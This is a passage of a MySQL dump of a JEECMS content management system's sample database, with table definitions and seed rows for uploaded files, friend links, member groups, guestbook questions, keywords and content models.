INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/v6/u/cms/www/201404/221353537d0o.doc','discuz_2.doc',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/v6/u/cms/www/201404/22140446zkgv.txt','jeecms新bug.txt',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/v6/u/cms/www/201404/22140629jx27.txt','360检测.txt',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/v6/u/cms/www/201404/22140634er4n.doc','Discuz_X2.0数据字典(数据库表作用解释).doc',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/v6/u/cms/www/201404/22140716e5bk.flv','/v6/u/cms/www/201404/22140716e5bk.flv',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/v6/u/cms/www/201404/22141101f9tv.txt','360检测.txt',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/v6/u/cms/www/201404/22141404irh6.docx','Apache_Shiro_使用手册.docx',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/v6/u/cms/www/201404/22142207xrqx.doc','Discuz_X2.0数据字典(数据库表作用解释).doc',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/v6/u/cms/www/201404/22145137jigp.docx','Apache_Shiro_使用手册.docx',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/v6/u/cms/www/201404/22145142drkb.docx','Apache_Shiro_使用手册.docx',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/v6/u/cms/www/201404/221501301rkt.docx','Apache_Shiro_使用手册.docx',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/v6/u/cms/www/201404/22151702mcwi.docx','Apache_Shiro_使用手册.docx',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/v6/u/cms/www/201404/22152145c9do.doc','Linux开启mysql远程连接.doc',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/v6/u/cms/www/201404/22152231wfrv.mp4','/v6/u/cms/www/201404/22152231wfrv.mp4',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/v6/u/cms/www/201404/22155743mgws.txt','bug平台推荐.txt',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/v6/u/cms/www/201404/22155756p9of.txt','flot柱状图.txt',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/v6/u/cms/www/201404/22155756scdn.txt','flot使用笔记.txt',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/v6/u/cms/www/201404/28134316erf3.jpg','mv1.jpg',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/v6/u/cms/www/201404/281402505i20.jpg','mv.jpg',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/v6/u/cms/www/201404/28140346452f.jpg','mv.jpg',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/v6/u/cms/www/201404/30140543hzlx.gif','webLogo.gif',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/v6/u/cms/www/201405/08091845sh2l.jpg','1.JPG',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/v6/u/cms/www/201405/08092143cyap.jpg','1.JPG',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/v6/u/cms/www/201405/08092249ype2.jpg','1.JPG',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/v6/u/cms/www/201405/08092924h3fr.jpg','1.JPG',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/v6/u/cms/www/201405/08093111b3jm.jpg','1.JPG',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/v6/u/cms/www/201405/09083819wiab.jpg','mv.jpg',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/v6/u/cms/www/201405/090840146ik7.jpg','mv.jpg',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/v6/u/cms/www/201405/090918028k13.jpg','mv.jpg',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/v6/u/cms/www/201406/09144419786f.txt','bbs好的功能.txt',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/v6/u/cms/www/201406/09145849ap2u.docx','1.docx',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/v6/u/cms/www/201406/09151219pj5s.doc','2.doc',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/v6/u/cms/www/201406/0915215434ij.txt','cmstop.txt',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/v6/u/cms/www/201407/121650299xv9.doc','DiscuzX2文件说明,目录说明.doc',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/v6/u/cms/www/201407/12165642273e.doc','Discuz_X2.0数据字典(数据库表作用解释).doc',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/v6/u/cms/www/201407/12170522j2ct.jpg','1.jpg',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/v6/u/cms/www/201407/30093714q9ic.mp4','/v6/u/cms/www/201407/30093714q9ic.mp4',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/v6/u/cms/www/201407/30130947bmm3.jpg','mv1.jpg',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/v6/u/cms/www/201407/30170627hj1m.jpg','mv.jpg',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/v6/u/cms/www/201407/31114444inln.jpg','mv1.jpg',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/v6/u/cms/www/201407/31114945lp9t.jpg','mv.jpg',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/v6/u/cms/www/201407/31115246futn.jpg','mv1.jpg',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/v6/u/cms/www/201407/31115423u7e6.jpg','mv1.jpg',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/v6/u/cms/www/201407/31132254zdh7.jpg','mv.jpg',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/v6/u/cms/www/201409/03105035q9em.mp4','/v6/u/cms/www/201409/03105035q9em.mp4',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/v6/u/cms/www/201409/03105050xcbs.txt','bug平台推荐.txt',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/v6/wenku/www/201312/241031214kys.txt','/v6/wenku/www/201312/241031214kys.txt',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/v6/wenku/www/201401/16164720tu2n.doc','/v6/wenku/www/201401/16164720tu2n.doc',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/v6/wenku/www/201401/17083718btie.doc','/v6/wenku/www/201401/17083718btie.doc',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/v6/wenku/www/201401/17084032522j.doc','/v6/wenku/www/201401/17084032522j.doc',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/v6/wenku/www/201401/170842070sy2.doc','/v6/wenku/www/201401/170842070sy2.doc',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/v6/wenku/www/201401/17084442fd08.doc','/v6/wenku/www/201401/17084442fd08.doc',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/v6/wenku/www/201401/17085101zvcg.doc','/v6/wenku/www/201401/17085101zvcg.doc',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/v6/wenku/www/201401/25095002cniq.doc','/v6/wenku/www/201401/25095002cniq.doc',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/v6/wenku/www/201403/10115402nl6c.docx','/v6/wenku/www/201403/10115402nl6c.docx',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/v6/wenku/www/201403/1011550974pv.docx','/v6/wenku/www/201403/1011550974pv.docx',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/v6/wenku/www/201403/101155409soa.txt','/v6/wenku/www/201403/101155409soa.txt',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/v6/wenku/www/201403/10115750uxwh.txt','/v6/wenku/www/201403/10115750uxwh.txt',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/v6/wenku/www/201406/04132656esvy.pdf','/v6/wenku/www/201406/04132656esvy.pdf',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/v6/wenku/www/201406/04133131ky4f.pdf','/v6/wenku/www/201406/04133131ky4f.pdf',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/v6/wenku/www/201406/04133159jryy.pdf','/v6/wenku/www/201406/04133159jryy.pdf',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/v6/wenku/www/201406/04133312rszg.pdf','/v6/wenku/www/201406/04133312rszg.pdf',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/v6/wenku/www/201406/04133437555h.pdf','/v6/wenku/www/201406/04133437555h.pdf',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/v6/wenku/www/201406/04133611h3sa.pdf','/v6/wenku/www/201406/04133611h3sa.pdf',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/v6/wenku/www/201406/041340029cmx.pdf','/v6/wenku/www/201406/041340029cmx.pdf',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/v6/wenku/www/201406/0413413473t5.pdf','/v6/wenku/www/201406/0413413473t5.pdf',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/v6/wenku/www/201406/041353368k3b.doc','/v6/wenku/www/201406/041353368k3b.doc',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/v6/wenku/www/201406/04135541s2ay.doc','/v6/wenku/www/201406/04135541s2ay.doc',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/v6/wenku/www/201408/08112543cj83.pdf','/v6/wenku/www/201408/08112543cj83.pdf',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/v6/wenku/www/201408/08131514njo0.pdf','/v6/wenku/www/201408/08131514njo0.pdf',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/v6/wenku/www/201411/061426416ze3.doc','/v6/wenku/www/201411/061426416ze3.doc',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/v6/wenku/www/201411/07142936mhzk.docx','/v6/wenku/www/201411/07142936mhzk.docx',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/v6/wenku/www/201411/07143112x1tn.docx','/v6/wenku/www/201411/07143112x1tn.docx',0,NULL);

#
# Source for table jc_friendlink
#

CREATE TABLE `jc_friendlink` (
  `friendlink_id` int(11) NOT NULL AUTO_INCREMENT,
  `site_id` int(11) NOT NULL,
  `friendlinkctg_id` int(11) NOT NULL,
  `site_name` varchar(150) NOT NULL COMMENT '网站名称',
  `domain` varchar(255) NOT NULL COMMENT '网站地址',
  `logo` varchar(150) DEFAULT NULL COMMENT '图标',
  `email` varchar(100) DEFAULT NULL COMMENT '站长邮箱',
  `description` varchar(255) DEFAULT NULL COMMENT '描述',
  `views` int(11) NOT NULL DEFAULT '0' COMMENT '点击次数',
  `is_enabled` char(1) NOT NULL DEFAULT '1' COMMENT '是否显示',
  `priority` int(11) NOT NULL DEFAULT '10' COMMENT '排列顺序',
  PRIMARY KEY (`friendlink_id`),
  KEY `fk_jc_ctg_friendlink` (`friendlinkctg_id`),
  KEY `fk_jc_friendlink_site` (`site_id`)
) ENGINE=InnoDB AUTO_INCREMENT=7 DEFAULT CHARSET=utf8 COMMENT='CMS友情链接';

#
# Dumping data for table jc_friendlink
#

INSERT INTO `jc_friendlink` (`friendlink_id`,`site_id`,`friendlinkctg_id`,`site_name`,`domain`,`logo`,`email`,`description`,`views`,`is_enabled`,`priority`) VALUES (1,1,1,'JEECMS官网','http://www.jeecms.com',NULL,'jeecms@163.com','JEECMS是JavaEE版网站管理系统（Java Enterprise Edition Content Manage System）的简称。Java凭借其强大、稳定、安全、高效等多方面的优势，一直是企业级应用的首选。',35,'1',1);
INSERT INTO `jc_friendlink` (`friendlink_id`,`site_id`,`friendlinkctg_id`,`site_name`,`domain`,`logo`,`email`,`description`,`views`,`is_enabled`,`priority`) VALUES (2,1,1,'JEEBBS论坛','http://bbs.jeecms.com',NULL,'jeecms@163.com','JEEBBS论坛',5,'1',10);
INSERT INTO `jc_friendlink` (`friendlink_id`,`site_id`,`friendlinkctg_id`,`site_name`,`domain`,`logo`,`email`,`description`,`views`,`is_enabled`,`priority`) VALUES (3,1,2,'京东商城','http://www.360buy.com/','/u/cms/www/201112/1910271036lr.gif','','',4,'1',10);
INSERT INTO `jc_friendlink` (`friendlink_id`,`site_id`,`friendlinkctg_id`,`site_name`,`domain`,`logo`,`email`,`description`,`views`,`is_enabled`,`priority`) VALUES (4,1,2,'当当网','http://www.dangdang.com/','/u/cms/www/201112/191408344rwj.gif','','',1,'1',10);
INSERT INTO `jc_friendlink` (`friendlink_id`,`site_id`,`friendlinkctg_id`,`site_name`,`domain`,`logo`,`email`,`description`,`views`,`is_enabled`,`priority`) VALUES (5,1,2,'亚马逊','http://www.amazon.cn/','/u/cms/www/201112/19141012lh2q.gif','','',2,'1',10);
INSERT INTO `jc_friendlink` (`friendlink_id`,`site_id`,`friendlinkctg_id`,`site_name`,`domain`,`logo`,`email`,`description`,`views`,`is_enabled`,`priority`) VALUES (6,1,2,'ihush','http://www.ihush.com/','/u/cms/www/201112/19141255yrfb.gif','','',1,'1',10);

#
# Source for table jc_friendlink_ctg
#

CREATE TABLE `jc_friendlink_ctg` (
  `friendlinkctg_id` int(11) NOT NULL AUTO_INCREMENT,
  `site_id` int(11) NOT NULL,
  `friendlinkctg_name` varchar(50) NOT NULL COMMENT '名称',
  `priority` int(11) NOT NULL DEFAULT '10' COMMENT '排列顺序',
  PRIMARY KEY (`friendlinkctg_id`),
  KEY `fk_jc_friendlinkctg_site` (`site_id`)
) ENGINE=InnoDB AUTO_INCREMENT=5 DEFAULT CHARSET=utf8 COMMENT='CMS友情链接类别';

#
# Dumping data for table jc_friendlink_ctg
#

INSERT INTO `jc_friendlink_ctg` (`friendlinkctg_id`,`site_id`,`friendlinkctg_name`,`priority`) VALUES (1,1,'文字链接',1);
INSERT INTO `jc_friendlink_ctg` (`friendlinkctg_id`,`site_id`,`friendlinkctg_name`,`priority`) VALUES (2,1,'品牌专区（图片链接）',2);
INSERT INTO `jc_friendlink_ctg` (`friendlinkctg_id`,`site_id`,`friendlinkctg_name`,`priority`) VALUES (4,1,'',10);

#
# Source for table jc_group
#

CREATE TABLE `jc_group` (
  `group_id` int(11) NOT NULL AUTO_INCREMENT,
  `group_name` varchar(100) NOT NULL COMMENT '名称',
  `priority` int(11) NOT NULL DEFAULT '10' COMMENT '排列顺序',
  `need_captcha` tinyint(1) NOT NULL DEFAULT '1' COMMENT '是否需要验证码',
  `need_check` tinyint(1) NOT NULL DEFAULT '1' COMMENT '是否需要审核',
  `allow_per_day` int(11) NOT NULL DEFAULT '4096' COMMENT '每日允许上传KB',
  `allow_max_file` int(11) NOT NULL DEFAULT '1024' COMMENT '每个文件最大KB',
  `allow_suffix` varchar(255) DEFAULT 'jpg,jpeg,gif,png,bmp' COMMENT '允许上传的后缀',
  `is_reg_def` tinyint(1) NOT NULL DEFAULT '0' COMMENT '是否默认会员组',
  PRIMARY KEY (`group_id`)
) ENGINE=InnoDB AUTO_INCREMENT=4 DEFAULT CHARSET=utf8 COMMENT='CMS会员组表';

#
# Dumping data for table jc_group
#

INSERT INTO `jc_group` (`group_id`,`group_name`,`priority`,`need_captcha`,`need_check`,`allow_per_day`,`allow_max_file`,`allow_suffix`,`is_reg_def`) VALUES (1,'普通会员',2,1,1,0,0,'',1);
INSERT INTO `jc_group` (`group_id`,`group_name`,`priority`,`need_captcha`,`need_check`,`allow_per_day`,`allow_max_file`,`allow_suffix`,`is_reg_def`) VALUES (2,'高级组',10,1,1,0,0,'',0);
INSERT INTO `jc_group` (`group_id`,`group_name`,`priority`,`need_captcha`,`need_check`,`allow_per_day`,`allow_max_file`,`allow_suffix`,`is_reg_def`) VALUES (3,'vip',11,1,1,0,0,'',0);

#
# Source for table jc_guestbook
#

CREATE TABLE `jc_guestbook` (
  `guestbook_id` int(11) NOT NULL AUTO_INCREMENT,
  `site_id` int(11) NOT NULL,
  `guestbookctg_id` int(11) NOT NULL,
  `member_id` int(11) DEFAULT NULL COMMENT '留言会员',
  `admin_id` int(11) DEFAULT NULL COMMENT '回复管理员',
  `ip` varchar(50) NOT NULL COMMENT '留言IP',
  `create_time` datetime NOT NULL COMMENT '留言时间',
  `replay_time` datetime DEFAULT NULL COMMENT '回复时间',
  `is_checked` tinyint(1) NOT NULL DEFAULT '0' COMMENT '是否审核',
  `is_recommend` tinyint(1) NOT NULL DEFAULT '0' COMMENT '是否推荐',
  PRIMARY KEY (`guestbook_id`),
  KEY `fk_jc_ctg_guestbook` (`guestbookctg_id`),
  KEY `fk_jc_guestbook_admin` (`admin_id`),
  KEY `fk_jc_guestbook_member` (`member_id`),
  KEY `fk_jc_guestbook_site` (`site_id`)
) ENGINE=InnoDB AUTO_INCREMENT=7 DEFAULT CHARSET=utf8 COMMENT='CMS留言';

#
# Dumping data for table jc_guestbook
#

INSERT INTO `jc_guestbook` (`guestbook_id`,`site_id`,`guestbookctg_id`,`member_id`,`admin_id`,`ip`,`create_time`,`replay_time`,`is_checked`,`is_recommend`) VALUES (3,1,1,NULL,1,'117.41.152.66','2016-10-10 15:02:04',NULL,1,1);
INSERT INTO `jc_guestbook` (`guestbook_id`,`site_id`,`guestbookctg_id`,`member_id`,`admin_id`,`ip`,`create_time`,`replay_time`,`is_checked`,`is_recommend`) VALUES (4,1,1,NULL,1,'117.41.152.66','2016-10-10 15:07:53',NULL,1,1);
INSERT INTO `jc_guestbook` (`guestbook_id`,`site_id`,`guestbookctg_id`,`member_id`,`admin_id`,`ip`,`create_time`,`replay_time`,`is_checked`,`is_recommend`) VALUES (5,1,1,NULL,1,'117.41.152.66','2016-10-10 15:08:41',NULL,1,1);
INSERT INTO `jc_guestbook` (`guestbook_id`,`site_id`,`guestbookctg_id`,`member_id`,`admin_id`,`ip`,`create_time`,`replay_time`,`is_checked`,`is_recommend`) VALUES (6,1,1,NULL,1,'117.41.152.66','2016-10-10 15:09:06',NULL,1,1);

#
# Source for table jc_guestbook_ctg
#

CREATE TABLE `jc_guestbook_ctg` (
  `guestbookctg_id` int(11) NOT NULL AUTO_INCREMENT,
  `site_id` int(11) NOT NULL,
  `ctg_name` varchar(100) NOT NULL COMMENT '名称',
  `priority` int(11) NOT NULL DEFAULT '10' COMMENT '排列顺序',
  `description` varchar(255) DEFAULT NULL COMMENT '描述',
  PRIMARY KEY (`guestbookctg_id`),
  KEY `fk_jc_guestbookctg_site` (`site_id`)
) ENGINE=InnoDB AUTO_INCREMENT=3 DEFAULT CHARSET=utf8 COMMENT='CMS留言类别';

#
# Dumping data for table jc_guestbook_ctg
#

INSERT INTO `jc_guestbook_ctg` (`guestbookctg_id`,`site_id`,`ctg_name`,`priority`,`description`) VALUES (1,1,'普通',1,'普通留言');
INSERT INTO `jc_guestbook_ctg` (`guestbookctg_id`,`site_id`,`ctg_name`,`priority`,`description`) VALUES (2,1,'投诉',10,'投诉');

#
# Source for table jc_guestbook_ext
#

CREATE TABLE `jc_guestbook_ext` (
  `guestbook_id` int(11) NOT NULL,
  `title` varchar(255) DEFAULT NULL COMMENT '留言标题',
  `content` longtext COMMENT '留言内容',
  `reply` longtext COMMENT '回复内容',
  `email` varchar(100) DEFAULT NULL COMMENT '电子邮件',
  `phone` varchar(100) DEFAULT NULL COMMENT '电话',
  `qq` varchar(50) DEFAULT NULL COMMENT 'QQ',
  KEY `fk_jc_ext_guestbook` (`guestbook_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='CMS留言内容';

#
# Dumping data for table jc_guestbook_ext
#

INSERT INTO `jc_guestbook_ext` (`guestbook_id`,`title`,`content`,`reply`,`email`,`phone`,`qq`) VALUES (3,'新版jeecms v8的改动很大，希望做得更好，持续关注中。','新版jeecms v8的改动很大，希望做得更好，持续关注中。',NULL,NULL,NULL,NULL);
INSERT INTO `jc_guestbook_ext` (`guestbook_id`,`title`,`content`,`reply`,`email`,`phone`,`qq`) VALUES (4,'怎么在页面首页放一个视频之后我点击的时候就可以看？','怎么在页面首页放一个视频之后我点击的时候就可以看？',NULL,NULL,NULL,NULL);
INSERT INTO `jc_guestbook_ext` (`guestbook_id`,`title`,`content`,`reply`,`email`,`phone`,`qq`) VALUES (5,'网店和论坛的用户管理和jeecms 可以统一起来吗？\t','网店和论坛的用户管理和jeecms 可以统一起来吗？\t',NULL,NULL,NULL,NULL);
INSERT INTO `jc_guestbook_ext` (`guestbook_id`,`title`,`content`,`reply`,`email`,`phone`,`qq`) VALUES (6,'请问在内容中上传视频的限制是多大，能不能自己设置设置视频的大小\t','请问在内容中上传视频的限制是多大，能不能自己设置设置视频的大小\t',NULL,NULL,NULL,NULL);

#
# Source for table jc_job_apply
#

CREATE TABLE `jc_job_apply` (
  `job_apply_id` int(11) NOT NULL AUTO_INCREMENT,
  `user_id` int(11) NOT NULL COMMENT '用户id',
  `content_id` int(11) NOT NULL COMMENT '职位id',
  `apply_time` datetime NOT NULL COMMENT '申请时间',
  PRIMARY KEY (`job_apply_id`),
  KEY `fk_jc_job_apply_user` (`user_id`),
  KEY `fk_jc_job_apply_content` (`content_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='职位申请表';

#
# Dumping data for table jc_job_apply
#


#
# Source for table jc_keyword
#

CREATE TABLE `jc_keyword` (
  `keyword_id` int(11) NOT NULL AUTO_INCREMENT,
  `site_id` int(11) DEFAULT NULL COMMENT '站点ID',
  `keyword_name` varchar(100) NOT NULL COMMENT '名称',
  `url` varchar(255) NOT NULL COMMENT '链接',
  `is_disabled` tinyint(1) NOT NULL DEFAULT '0' COMMENT '是否禁用',
  PRIMARY KEY (`keyword_id`),
  KEY `fk_jc_keyword_site` (`site_id`)
) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=utf8 COMMENT='CMS内容关键词表';

#
# Dumping data for table jc_keyword
#

INSERT INTO `jc_keyword` (`keyword_id`,`site_id`,`keyword_name`,`url`,`is_disabled`) VALUES (1,NULL,'内容管理系统','<a href=\"http://www.jeecms.com/\" target=\"_blank\">内容管理系统</a>',0);

#
# Source for table jc_log
#

CREATE TABLE `jc_log` (
  `log_id` int(11) NOT NULL AUTO_INCREMENT,
  `user_id` int(11) DEFAULT NULL,
  `site_id` int(11) DEFAULT NULL,
  `category` int(11) NOT NULL COMMENT '日志类型',
  `log_time` datetime NOT NULL COMMENT '日志时间',
  `ip` varchar(50) DEFAULT NULL COMMENT 'IP地址',
  `url` varchar(255) DEFAULT NULL COMMENT 'URL地址',
  `title` varchar(255) DEFAULT NULL COMMENT '日志标题',
  `content` varchar(255) DEFAULT NULL COMMENT '日志内容',
  PRIMARY KEY (`log_id`),
  KEY `fk_jc_log_site` (`site_id`),
  KEY `fk_jc_log_user` (`user_id`)
) ENGINE=InnoDB AUTO_INCREMENT=18 DEFAULT CHARSET=utf8 COMMENT='CMS日志表';

#
# Dumping data for table jc_log
#


#
# Source for table jc_message
#

CREATE TABLE `jc_message` (
  `msg_id` int(11) NOT NULL AUTO_INCREMENT COMMENT '消息id',
  `msg_title` varchar(255) NOT NULL DEFAULT '' COMMENT '标题',
  `msg_content` longtext COMMENT '站内信息内容',
  `send_time` timestamp NULL DEFAULT NULL COMMENT '发送时间',
  `msg_send_user` int(11) NOT NULL DEFAULT '1' COMMENT '发信息人',
  `msg_receiver_user` int(11) NOT NULL DEFAULT '0' COMMENT '接收人',
  `site_id` int(11) NOT NULL DEFAULT '1' COMMENT '站点',
  `msg_status` tinyint(1) NOT NULL DEFAULT '0' COMMENT '消息状态0未读，1已读',
  `msg_box` int(2) NOT NULL DEFAULT '1' COMMENT '消息信箱 0收件箱 1发件箱 2草稿箱 3垃圾箱',
  PRIMARY KEY (`msg_id`),
  KEY `fk_jc_message_user_send` (`msg_send_user`),
  KEY `fk_jc_message_user_receiver` (`msg_receiver_user`),
  KEY `fk_jc_message_site` (`site_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='站内信';

#
# Dumping data for table jc_message
#


#
# Source for table jc_model
#

CREATE TABLE `jc_model` (
  `model_id` int(11) NOT NULL,
  `model_name` varchar(100) NOT NULL COMMENT '名称',
  `model_path` varchar(100) NOT NULL COMMENT '路径',
  `tpl_channel_prefix` varchar(20) DEFAULT NULL COMMENT '栏目模板前缀',
  `tpl_content_prefix` varchar(20) DEFAULT NULL COMMENT '内容模板前缀',
  `title_img_width` int(11) NOT NULL DEFAULT '139' COMMENT '栏目标题图宽度',
  `title_img_height` int(11) NOT NULL DEFAULT '139' COMMENT '栏目标题图高度',
  `content_img_width` int(11) NOT NULL DEFAULT '310' COMMENT '栏目内容图宽度',
  `content_img_height` int(11) NOT NULL DEFAULT '310' COMMENT '栏目内容图高度',
  `priority` int(11) NOT NULL DEFAULT '10' COMMENT '排列顺序',
  `has_content` tinyint(1) NOT NULL DEFAULT '1' COMMENT '是否有内容',
  `is_disabled` tinyint(1) NOT NULL DEFAULT '0' COMMENT '是否禁用',
  `is_def` tinyint(1) NOT NULL DEFAULT '0' COMMENT '是否默认模型',
  `is_global` tinyint(1) NOT NULL DEFAULT '1' COMMENT '是否全站模型',
  `site_id` int(11) DEFAULT NULL COMMENT '非全站模型所属站点',
  PRIMARY KEY (`model_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='CMS模型表';

#
# Dumping data for table jc_model
#

INSERT INTO `jc_model` (`model_id`,`model_name`,`model_path`,`tpl_channel_prefix`,`tpl_content_prefix`,`title_img_width`,`title_img_height`,`content_img_width`,`content_img_height`,`priority`,`has_content`,`is_disabled`,`is_def`,`is_global`,`site_id`) VALUES (1,'新闻','1','news','news',139,139,310,310,1,1,0,1,1,NULL);
INSERT INTO `jc_model` (`model_id`,`model_name`,`model_path`,`tpl_channel_prefix`,`tpl_content_prefix`,`title_img_width`,`title_img_height`,`content_img_width`,`content_img_height`,`priority`,`has_content`,`is_disabled`,`is_def`,`is_global`,`site_id`) VALUES (2,'单页','2','alone','alone',139,139,310,310,2,0,0,0,1,NULL);
